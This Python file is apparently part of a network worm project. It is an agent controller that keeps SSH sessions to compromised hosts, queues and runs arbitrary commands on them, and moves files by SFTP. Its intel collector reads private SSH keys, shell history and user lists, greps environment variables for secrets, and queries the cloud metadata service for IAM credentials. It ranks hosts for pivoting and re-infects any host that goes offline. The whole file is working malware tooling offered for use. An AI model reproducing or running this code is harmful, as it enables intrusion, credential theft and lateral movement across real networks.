# -*- coding: utf-8 -*-
"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Agent Controller v2.0 — Real control of infected hosts
Improvements over the basic host_monitor.py:
  1. Heartbeat tracker — detects dead agents and auto-re-infects
  2. Persistent session pool — maintain SSH shells per agent
  3. Async task queue per agent — queue commands, execute on check-in
  4. Intel harvesting — hostname, users, interfaces, processes on connect
  5. Remote command execution with output capture
  6. Agent scoring — rank agents by value/reliability for pivot selection
"""

import hashlib
import json
import os
import queue
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any, Callable, Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
# Agent Session (represents one infected host)
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class AgentSession:
    ip: str
    username: str
    password: str
    os_type: str = "unknown"
    hostname: str = ""
    asset_value: int = 10
    last_seen: float = field(default_factory=time.time)
    first_seen: float = field(default_factory=time.time)
    check_ins: int = 0
    commands_run: int = 0
    alive: bool = True
    ssh_client: Any = None  # paramiko.SSHClient if active
    task_queue: queue.Queue = field(default_factory=queue.Queue)
    results: Dict = field(default_factory=dict)
    intel: Dict = field(default_factory=dict)

    @property
    def agent_id(self) -> str:
        return hashlib.md5(f"{self.ip}:{self.username}".encode()).hexdigest()[:8]

    @property
    def idle_seconds(self) -> float:
        return time.time() - self.last_seen

    @property
    def is_stale(self, threshold: int = 600) -> bool:
        return self.idle_seconds > threshold


# ─────────────────────────────────────────────────────────────────────────────
# SSH Session Manager
# ─────────────────────────────────────────────────────────────────────────────
class SSHSessionManager:
    """Maintains persistent SSH connections per agent."""

    def __init__(self, connect_timeout: int = 10):
        self.timeout = connect_timeout
        self._sessions: Dict[str, Any] = {}  # ip → paramiko.SSHClient
        self._lock = threading.Lock()

    def get_or_connect(self, ip: str, username: str, password: str) -> Optional[Any]:
        """Return existing SSH session or create a new one."""
        try:
            import paramiko
        except ImportError:
            logger.warning("paramiko required for SSH sessions")
            return None

        with self._lock:
            existing = self._sessions.get(ip)
            if existing:
                try:
                    existing.exec_command("echo alive", timeout=3)
                    return existing
                except Exception:
                    pass  # Reconnect

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    ip,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    banner_timeout=self.timeout,
                    auth_timeout=self.timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                self._sessions[ip] = client
                logger.success(f"SSH session established: {username}@{ip}")
                return client
            except Exception as e:
                logger.debug(f"SSH connect to {ip} failed: {e}")
                return None

    def execute(
        self, ip: str, username: str, password: str, command: str, timeout: int = 15
    ) -> Tuple[int, str, str]:
        """
        Execute command via SSH, return (returncode, stdout, stderr).
        Auto-reconnects if session is stale.
        """
        client = self.get_or_connect(ip, username, password)
        if not client:
            return -1, "", "SSH unavailable"
        try:
            _, stdout, stderr = client.exec_command(command, timeout=timeout)
            rc = stdout.channel.recv_exit_status()
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            return rc, out, err
        except Exception as e:
            # Session likely dead — remove and retry once
            with self._lock:
                self._sessions.pop(ip, None)
            return -1, "", str(e)

    def put_file(
        self, ip: str, username: str, password: str, local_path: str, remote_path: str
    ) -> bool:
        """SFTP transfer."""
        client = self.get_or_connect(ip, username, password)
        if not client:
            return False
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            return True
        except Exception as e:
            logger.debug(f"SFTP put to {ip} failed: {e}")
            return False

    def get_file(
        self, ip: str, username: str, password: str, remote_path: str, local_path: str
    ) -> bool:
        """SFTP download."""
        client = self.get_or_connect(ip, username, password)
        if not client:
            return False
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            return True
        except Exception as e:
            logger.debug(f"SFTP get from {ip} failed: {e}")
            return False

    def close_all(self):
        with self._lock:
            for client in self._sessions.values():
                try:
                    client.close()
                except Exception:
                    pass
            self._sessions.clear()


# ─────────────────────────────────────────────────────────────────────────────
# Intel Collector (quick post-compromise enumeration)
# ─────────────────────────────────────────────────────────────────────────────
class QuickIntelCollector:
    """Collect high-value intel from a fresh compromise in < 30 seconds."""

    LINUX_COMMANDS = {
        "whoami": "whoami && id",
        "hostname": "hostname -f 2>/dev/null || hostname",
        "os": "cat /etc/os-release 2>/dev/null | head -5",
        "interfaces": 'ip addr show 2>/dev/null | grep "inet " | head -10',
        "routes": "ip route 2>/dev/null | head -5",
        "users": "cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1",
        "sudo_rights": "sudo -l 2>/dev/null | tail -5",
        "suid": "find / -perm -4000 -type f 2>/dev/null | head -10",
        "sensitive_files": "ls /etc/shadow /etc/crontab ~/.ssh/ /root/ 2>/dev/null",
        "env_secrets": 'env 2>/dev/null | grep -iE "key|pass|secret|token|aws|api" | head -5',
        "processes": 'ps aux 2>/dev/null | grep -vE "^root.*\\[" | head -15',
        "listening": "ss -tlnp 2>/dev/null | head -15",
        "history": "cat ~/.bash_history 2>/dev/null | tail -10",
        "ssh_keys": "cat ~/.ssh/id_rsa 2>/dev/null | head -3; ls ~/.ssh/ 2>/dev/null",
        "cloud_meta": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -5",
    }

    def collect(self, ssh_mgr: SSHSessionManager, ip: str, username: str, password: str) -> Dict:
        """Run all intel commands concurrently."""
        intel = {"ip": ip, "collected_at": datetime.utcnow().isoformat()}

        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {
                ex.submit(ssh_mgr.execute, ip, username, password, cmd, 8): key
                for key, cmd in self.LINUX_COMMANDS.items()
            }
            for fut in futures:
                key = futures[fut]
                try:
                    rc, stdout, _ = fut.result()
                    if stdout.strip():
                        intel[key] = stdout.strip()[:400]
                except Exception:
                    pass

        # Score asset value from intel
        value = 10
        if "root" in intel.get("whoami", ""):
            value += 40
        if intel.get("sudo_rights"):
            value += 25
        if intel.get("suid"):
            value += 15
        if intel.get("env_secrets"):
            value += 20
        if intel.get("ssh_keys"):
            value += 15
        if intel.get("cloud_meta"):
            value += 35  # Cloud IAM = jackpot
        intel["asset_value"] = min(100, value)

        # Extract internal IPs for pivot
        import re

        iface_data = intel.get("interfaces", "")
        ips = re.findall(r"inet\s+(\d+\.\d+\.\d+\.\d+)", iface_data)
        intel["internal_ips"] = [ip for ip in ips if not ip.startswith("127.")]

        logger.success(
            f"Intel from {ip}: value={intel['asset_value']}, "
            f"root={'yes' if 'root' in intel.get('whoami','') else 'no'}, "
            f"internal_ips={intel.get('internal_ips', [])}"
        )
        return intel


# ─────────────────────────────────────────────────────────────────────────────
# Agent Controller (main class)
# ─────────────────────────────────────────────────────────────────────────────
class AgentController:
    """
    Central controller for all infected agent sessions.
    - Heartbeat monitoring with automatic re-infection
    - Task queuing per agent
    - Intel collection on check-in
    - Agent scoring for pivot selection
    - Persistent SSH session pool
    """

    def __init__(
        self, heartbeat_interval: int = 60, stale_threshold: int = 600, max_workers: int = 20
    ):
        self.heartbeat_interval = heartbeat_interval
        self.stale_threshold = stale_threshold
        self.max_workers = max_workers

        self._agents: Dict[str, AgentSession] = {}  # agent_id → session
        self._lock = threading.RLock()
        self._ssh_mgr = SSHSessionManager()
        self._intel_col = QuickIntelCollector()
        self._hb_thread: Optional[threading.Thread] = None
        self._running = False
        self._on_dead_agent: Optional[Callable] = None  # callback for re-infection

    def register_agent(
        self,
        ip: str,
        username: str,
        password: str,
        os_type: str = "linux",
        collect_intel: bool = True,
    ) -> str:
        """Register a newly compromised host as an agent."""
        session = AgentSession(ip=ip, username=username, password=password, os_type=os_type)

        if collect_intel:
            try:
                intel = self._intel_col.collect(self._ssh_mgr, ip, username, password)
                session.intel = intel
                session.hostname = intel.get("hostname", ip)
                session.asset_value = intel.get("asset_value", 10)
            except Exception as e:
                logger.debug(f"Intel collection failed for {ip}: {e}")

        with self._lock:
            self._agents[session.agent_id] = session
        logger.success(
            f"Agent registered: {session.agent_id} ({ip}) "
            f"value={session.asset_value} os={os_type}"
        )
        return session.agent_id

    def enqueue_task(
        self, agent_id: str, command: str, callback: Optional[Callable] = None
    ) -> bool:
        """Queue a command for execution on a specific agent."""
        with self._lock:
            agent = self._agents.get(agent_id)
        if not agent:
            return False
        agent.task_queue.put({"cmd": command, "cb": callback, "ts": time.time()})
        return True

    def enqueue_task_all(self, command: str, min_value: int = 0):
        """Queue a command on all active agents above min_value threshold."""
        with self._lock:
            agents = list(self._agents.values())
        count = 0
        for a in agents:
            if a.alive and a.asset_value >= min_value:
                a.task_queue.put({"cmd": command, "cb": None, "ts": time.time()})
                count += 1
        logger.info(f"Task queued on {count} agents: {command[:50]}")
        return count

    def execute_now(self, agent_id: str, command: str, timeout: int = 15) -> Tuple[int, str]:
        """Execute a command immediately on an agent (blocking)."""
        with self._lock:
            agent = self._agents.get(agent_id)
        if not agent or not agent.alive:
            return -1, "Agent not available"
        rc, stdout, stderr = self._ssh_mgr.execute(
            agent.ip, agent.username, agent.password, command, timeout
        )
        agent.commands_run += 1
        agent.last_seen = time.time()
        return rc, stdout or stderr

    def flush_tasks(self, agent_id: str) -> List[Dict]:
        """Execute all pending tasks for an agent. Returns results list."""
        with self._lock:
            agent = self._agents.get(agent_id)
        if not agent:
            return []

        results = []
        while not agent.task_queue.empty():
            task = agent.task_queue.get_nowait()
            rc, output = self.execute_now(agent_id, task["cmd"])
            result = {"cmd": task["cmd"], "rc": rc, "output": output[:500]}
            results.append(result)
            agent.results[task["cmd"]] = result
            if task.get("cb"):
                try:
                    task["cb"](result)
                except Exception:
                    pass
        return results

    def heartbeat_check(self) -> Dict:
        """
        Check all agents are alive via TCP probe.
        Marks dead agents and triggers re-infection callback.
        """
        with self._lock:
            agents = list(self._agents.values())

        alive_count = 0
        dead_count = 0

        for agent in agents:
            is_alive = self._probe_alive(agent.ip)
            agent.alive = is_alive

            if is_alive:
                alive_count += 1
                agent.check_ins += 1
                agent.last_seen = time.time()
                # Flush pending tasks on reconnect
                if not agent.task_queue.empty():
                    threading.Thread(
                        target=self.flush_tasks, args=(agent.agent_id,), daemon=True
                    ).start()
            else:
                dead_count += 1
                logger.warning(
                    f"Agent {agent.agent_id} ({agent.ip}) is DEAD "
                    f"(last seen {agent.idle_seconds:.0f}s ago)"
                )
                if self._on_dead_agent:
                    try:
                        self._on_dead_agent(agent)
                    except Exception:
                        pass

        return {"alive": alive_count, "dead": dead_count, "total": len(agents)}

    def _probe_alive(self, ip: str, ports: List[int] = None) -> bool:
        """TCP probe to check if host is reachable."""
        for port in ports or [22, 80, 443, 445]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if s.connect_ex((ip, port)) == 0:
                    s.close()
                    return True
                s.close()
            except Exception:
                pass
        return False

    def start_heartbeat_monitor(self, on_dead_agent: Callable = None):
        """Start background heartbeat thread."""
        self._on_dead_agent = on_dead_agent
        self._running = True

        def _loop():
            while self._running:
                try:
                    stats = self.heartbeat_check()
                    logger.debug(f"Heartbeat: alive={stats['alive']} dead={stats['dead']}")
                except Exception as e:
                    logger.debug(f"Heartbeat error: {e}")
                time.sleep(self.heartbeat_interval)

        self._hb_thread = threading.Thread(target=_loop, daemon=True)
        self._hb_thread.start()
        logger.info(f"Heartbeat monitor started (interval={self.heartbeat_interval}s)")

    def stop(self):
        self._running = False
        self._ssh_mgr.close_all()

    def get_best_pivots(self, top_n: int = 5) -> List[AgentSession]:
        """Return top N alive agents ranked by asset_value for pivot selection."""
        with self._lock:
            alive = [a for a in self._agents.values() if a.alive]
        return sorted(alive, key=lambda a: a.asset_value, reverse=True)[:top_n]

    def get_all_intel(self) -> List[Dict]:
        """Return intel from all agents."""
        with self._lock:
            return [dict(a.intel, agent_id=a.agent_id) for a in self._agents.values()]

    def get_report(self) -> Dict:
        with self._lock:
            agents = list(self._agents.values())
        return {
            "total_agents": len(agents),
            "alive_agents": sum(1 for a in agents if a.alive),
            "total_commands": sum(a.commands_run for a in agents),
            "avg_asset_value": sum(a.asset_value for a in agents) / max(len(agents), 1),
            "agents": [
                {
                    "id": a.agent_id,
                    "ip": a.ip,
                    "hostname": a.hostname,
                    "os": a.os_type,
                    "alive": a.alive,
                    "value": a.asset_value,
                    "check_ins": a.check_ins,
                    "idle": f"{a.idle_seconds:.0f}s",
                    "queued": a.task_queue.qsize(),
                }
                for a in agents
            ],
        }
